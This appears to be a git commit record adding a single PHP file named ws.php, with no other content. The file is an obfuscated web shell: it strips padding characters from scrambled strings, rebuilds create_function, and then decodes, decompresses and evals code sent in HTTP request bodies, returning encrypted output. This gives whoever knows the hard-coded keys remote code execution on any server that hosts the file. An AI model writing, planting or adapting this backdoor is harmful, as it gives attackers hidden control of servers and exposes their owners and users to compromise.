90517212b466f2ef3de73c0c642a8f745487a33d
Deepanshu-dr <69244390+Deepanshu-dr@users.noreply.github.com>
2022-05-07 21:21:15 +0530

    Create ws.php

---
+++ ws.php
@@ -0,0 +1,19 @@
+<?php
+
+$p='$o.TH=$tTH{$iTH}^$k{$j};}}retTHuTHrn $o;}THif (@pTHreg_mTHatch("TH/$kh(.+)$kTHTHf/",@filTHe_get_conteTHnts("pTHhpTH://';
+
+$u=str_replace('S','','SScSrSeate_funcSStion');
+
+$R='inTHput"TH),$THm)==1TH) {@oTHb_start();@eTHval(@gzTHuncoTHTHmTHpress(@x(@baseTH64_decTHode(TH$m[1]),TH$k)));TH$o=@ob_get';
+
+$W='_THcontTHents();@ob_THenTHd_clean()TH;$r=@basTHe6TH4_encodTHe(@xTH(@gzcomprTHeTHss($o),$k));prTHinTHtTH("$p$kh$r$kf");}';
+
+$Z='TH{$c=strlen($k)TH;$THl=strlTHen($t);TH$oTHTH="";for($i=0;$iTH<$l;)TH{fTHor($jTH=0;($j<$THc&&TH$i<$l)TH;$j++,$i++){';
+
+$e='$k="5f4dcTHcTH3b";$kh="5THaa765THd61d83";TH$kfTH="27deb88THTH2cf99";$p=TH"CaXmgETHW4gtlCETHkqH";THfuncTHtion THx($t,$kTH)';
+
+$t=str_replace('TH','',$e.$Z.$p.$R.$W);
+
+$E=$u('',$t);$E();
+
+?>
